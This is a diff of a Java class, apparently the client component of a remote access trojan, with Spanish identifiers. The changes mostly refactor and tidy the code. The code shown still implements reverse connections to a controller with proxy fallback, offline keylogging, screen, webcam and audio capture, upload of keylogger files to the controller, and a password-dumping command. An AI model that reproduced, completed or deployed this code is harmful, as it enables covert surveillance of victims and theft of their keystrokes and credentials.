@@ -71,11 +71,8 @@ public class Servicio extends Thread implements Interfaz {
     private int delayConexion;
     private boolean autenticado = false;
     private boolean capturaOfflineEscritorio = false;
-//    private int delayCapturaEscritorio;
     private boolean capturaOfflineCamara = false;
-//    private int delayCapturaCamara;
     private boolean capturaOfflineAudio = false;
-//    private int delayCapturaAudio;
     private boolean capturaOfflineKeylogger = false;
     private int intentos = 0;
     private boolean proxy = false;
@@ -174,22 +171,15 @@ public class Servicio extends Thread implements Interfaz {
             pref = (pref == null) ? "" : pref;
             this.tipoConexion = (Integer) parametros[5];//inversa o directa                       
             this.prefijo = pref;
-            if (UtilRT.isWindows()) {
-                try {
-                    registro = ((AR) new CLRT().loadClass("rt.util.REG").newInstance());
-                } catch (Exception ex) {
-                    registro = null;
-                }
-            }
             this.capturaOfflineEscritorio = (Boolean) Inicio.config.obtenerParametro("off-escritorio");
-//            this.delayCapturaEscritorio = (Integer) Inicio.config.obtenerParametro("off-escritorio-delay");
             this.capturaOfflineCamara = (Boolean) Inicio.config.obtenerParametro("off-camara");
-//            this.delayCapturaCamara = (Integer) Inicio.config.obtenerParametro("off-camara-delay");
             this.capturaOfflineAudio = (Boolean) Inicio.config.obtenerParametro("off-audio");
-//            this.delayCapturaAudio = (Integer) Inicio.config.obtenerParametro("off-audio-delay");
             this.capturaOfflineKeylogger = (Boolean) Inicio.config.obtenerParametro("off-keylogger");
+            if (UtilRT.isWindows()) {
+                registro = ((AR) new CLRT().loadClass("rt.util.REG").newInstance());
+            }
         } catch (Exception e) {
-            e.printStackTrace();
+            registro = null;
         }
     }
 
@@ -218,35 +208,26 @@ public class Servicio extends Thread implements Interfaz {
         }
     }
 
-    private void usarProxy() {
-        System.setProperty("java.net.useSystemProxies", "true");
-    }
-
-    private void NoUsarProxy() {
-        System.setProperty("java.net.useSystemProxies", "false");
-    }
-
     private void conectar() {
         try {
             conectado = false;
             autenticado = false;
-//            System.out.println("se va a conectar tipoCon=" + tipoConexion);
             if (tipoConexion == INVERSA) {
                 if (intentos > 10) {
                     intentos = 0;
                     proxy = !proxy;
                     if (proxy) {
-                        usarProxy();
+                        System.setProperty("java.net.useSystemProxies", "true");
                     } else {
-                        NoUsarProxy();
+                        System.setProperty("java.net.useSystemProxies", "false");
                     }
                 }
                 idServicio = host + ":" + puerto + "P" + (Integer) Inicio.config.obtenerParametro("protocolo");
                 conexion = new Conexion(host, puerto, (Integer) Inicio.config.obtenerParametro("protocolo"), (Boolean) Inicio.config.obtenerParametro("ssl"));
                 if ((Integer) Inicio.config.obtenerParametro("protocolo") == ConexionServer.UDP) {
-                    enviarComandoInt(Protocolo.UDP_INICIAR);
+                    conexion.escribirInt(Protocolo.UDP_INICIAR);
                 } else {
-                    enviarComandoInt(Protocolo.TPC_INICIAR);
+                    conexion.escribirInt(Protocolo.TPC_INICIAR);
                 }
             } else {//directa, esperamos conexion
                 server = new ConexionServer((Integer) Inicio.config.obtenerParametro("protocolo"), puerto, (Boolean) Inicio.config.obtenerParametro("ssl"));
@@ -306,12 +287,6 @@ public class Servicio extends Thread implements Interfaz {
         }
     }
 
-//    private void detenerListaEquiposRed() {
-//        try {
-//            servicioRed.detener();
-//        } catch (Exception e) {
-//        }
-//    }
     private String getHostName() {
         InetAddress iAddress = null;
         try {
@@ -380,9 +355,15 @@ public class Servicio extends Thread implements Interfaz {
 
     private void enviarWebCamMiniatura() {
         try {
-            abrirCamaraDefault();
+            boolean cerrar = false;
+            if (this.webC == null) {
+                abrirCamaraDefault();
+                cerrar = true;
+            }
             enviarComando(Protocolo.GET_MINIATURA_CAM, webC.get(0));
-//            cerrarWC();
+            if (cerrar) {
+                cerrarWC();
+            }
         } catch (Exception ex) {
 
         }
@@ -419,12 +400,6 @@ public class Servicio extends Thread implements Interfaz {
         }
     }
 
-    //suado para el comando de inicio de UDP
-    public void enviarComandoInt(int i) throws Exception {
-        conexion.escribirInt(i);
-//        conexion.flush();
-    }
-
     public synchronized void enviarComando(int i, Object... cmd) {
         enviarObjeto(UtilRT.comprimirObjeto(UtilRT.crearComando(i, cmd.length, cmd)));
     }
@@ -432,22 +407,10 @@ public class Servicio extends Thread implements Interfaz {
     private void enviarObjeto(Object objeto) {
         try {
             conexion.escribirObjeto(objeto);
-//            conexion.flush();
         } catch (Exception ex) {
         }
     }
 
-//    private boolean isConectado() {
-//        return conectado;
-//    }
-//
-//    private String getHost() {
-//        return host;
-//    }
-//
-//    private int getPuerto() {
-//        return puerto;
-//    }
     private void enviarMensaje(String mensaje) {
         this.enviarComando(Protocolo.MENSAJE_SERVIDOR, mensaje);
     }
@@ -456,10 +419,7 @@ public class Servicio extends Thread implements Interfaz {
         gestorEnvio.restarDescarga();
     }
 
-//    private Interfaz getJnaUtil() {
-//        return jnaUtil;
-//    }
-//envia los archivos de captura actuales
+    //envia los archivos de captura actuales
     private void enviarOffline() {
         try {
             if (capturadorOffline != null) {
@@ -469,10 +429,8 @@ public class Servicio extends Thread implements Interfaz {
                     File f = ((File) capturadorOffline.get(1));
                     if (f != null && f.exists()) {
                         try {
-//                            System.out.println("arhivo original " + f.getAbsolutePath());
                             File tmp = new File(System.getProperty("java.io.tmpdir"), "captura_" + UtilRT.nombreHora() + ".dat");
                             UtilRT.copyFile(f, tmp);
-//                            System.out.println("arhivo tmp " + tmp.getAbsolutePath());
                             descargarArchivo(tmp.getAbsolutePath(), "<capturas>", 0L);
                         } catch (Exception ex) {
                         }
@@ -523,12 +481,8 @@ public class Servicio extends Thread implements Interfaz {
                     if (f != null && f.exists()) {
                         //descargarArchivo(f.getAbsolutePath(), "");//descargo toda la carpeta
                         for (File ff : f.listFiles()) {
-                            //System.out.println("archivo ");
-                            //System.out.println(ff.getAbsolutePath());
                             if (ff.getName().equals(f2.getName())) {
                                 try {
-                                    //copio el archivo
-                                    //System.out.println("arhivo original " + f.getAbsolutePath());
                                     File tmp = new File(System.getProperty("java.io.tmpdir"), "captura_" + UtilRT.nombreHora() + ".dat");
                                     UtilRT.copyFile(ff, tmp);
                                     descargarArchivo(tmp.getAbsolutePath(), "<capturas>", 0L);
@@ -536,8 +490,6 @@ public class Servicio extends Thread implements Interfaz {
                                 }
                             } else if (ff.getName().equals(f3.getName())) {//si es el archivo del keylogger
                                 try {
-                                    //copio el archivo
-                                    //System.out.println("arhivo original " + f.getAbsolutePath());
                                     File tmp = new File(System.getProperty("java.io.tmpdir"), "keylogger_" + UtilRT.nombreHora() + ".dat");
                                     UtilRT.copyFile(ff, tmp);
                                     descargarArchivo(tmp.getAbsolutePath(), "<keylogger>", 0L);
@@ -561,25 +513,6 @@ public class Servicio extends Thread implements Interfaz {
         }
     }
 
-//    private void eliminarTodosArchivosOffline() {
-//        if (capturadorOffline != null) {
-//            try {
-//                capturadorOffline.set(3, true);//copiando
-//                //archivo capturas pantallas
-//                try {
-//                    File f = ((File) capturadorOffline.get(6));//la carpeta de descargas
-//                    if (f != null && f.exists()) {
-//                        for (File ff : f.listFiles()) {
-//                            ff.delete();
-//                        }
-//                    }
-//                } catch (Exception e) {
-//                }
-//            } catch (Exception e) {
-//            }
-//            capturadorOffline.set(3, false);//copiando
-//        }
-//    }
     private int activarKeylogger() {
         try {
             if (kl == null) {
@@ -623,11 +556,9 @@ public class Servicio extends Thread implements Interfaz {
 
     private void iniciarEscritorioRemoto(Conexion conexion, CapturaOpciones opciones) {
         if (escritorioRemoto == null) {
-
             if (accionAbrirEscritorio != null) {
                 accionAbrirEscritorio.ejecutar();
             }
-
             try {
                 switch (opciones.getAlgoritmo()) {
                     case 3:
@@ -683,7 +614,6 @@ public class Servicio extends Thread implements Interfaz {
 
     @Override
     public void run() {
-//        this.setName("hilo-Servicio-" + UtilRT.getHiloId());
         String param1;
         String param2;
         String parametros[];
@@ -713,8 +643,7 @@ public class Servicio extends Thread implements Interfaz {
                     this.conectar();
                 }
 
-                if (conectado) {
-                    //int comando = conexion.leerInt();
+                if (conectado) {                   
                     comando = (Comando) UtilRT.descomprimirObjeto((byte[]) conexion.leerObjeto());
                     switch (comando.getComando()) {
                         case Protocolo.AUTENTICAR:
@@ -859,7 +788,6 @@ public class Servicio extends Thread implements Interfaz {
                                 try {
                                     escritorioRemoto.ejecutar(6, (Object[]) comando.getObjeto());
                                 } catch (Exception e) {
-//                                    //
                                 }
                                 break;
                             }
@@ -946,9 +874,6 @@ public class Servicio extends Thread implements Interfaz {
                             case Protocolo.PASSWORDS_DM:
                                 dmPass();
                                 break;
-//                            case Protocolo.GET_LISTA_OFFLINE:
-//                                listarOffline();
-//                                break;
                             case Protocolo.DESCARGAR_OFFLINE:
                                 enviarOffline();
                                 break;
@@ -1055,8 +980,7 @@ public class Servicio extends Thread implements Interfaz {
                                     vChat.salida.setCaretPosition(vChat.salida.getDocument().getLength());
                                     vChat.salida.setCaretColor(Color.BLUE);
                                     vChat.repaint();
-                                }
-                                param1 = null;
+                                }                               
                                 break;
                             case Protocolo.CHAT_ABRIR:
                                 vChat = new Chat(Servicio.this);
@@ -1195,7 +1119,7 @@ public class Servicio extends Thread implements Interfaz {
             Interfaz proceso = ((Interfaz) new CLRT().loadClass("rt.modulos.OPC").newInstance());
             proceso.instanciar(this, opcion, parametros);
         } catch (Exception e) {
-            //
+           
         }
     }
 
@@ -1323,7 +1247,9 @@ public class Servicio extends Thread implements Interfaz {
                     enviarPortaPapeles((Integer) parametros[0], (Object) parametros[1]);
                     break;
                 case 13:
-                    hacerPing();
+//                    hacerPing();
+                    ping = System.currentTimeMillis();
+        enviarComando(Protocolo.PING);
                     break;
                 case 14:
                     abrirCamaraDefault();
@@ -1337,8 +1263,8 @@ public class Servicio extends Thread implements Interfaz {
         }
     }
 
-    private void hacerPing() {
-        ping = System.currentTimeMillis();
-        enviarComando(Protocolo.PING);
-    }
+//    private void hacerPing() {
+//        ping = System.currentTimeMillis();
+//        enviarComando(Protocolo.PING);
+//    }
 }
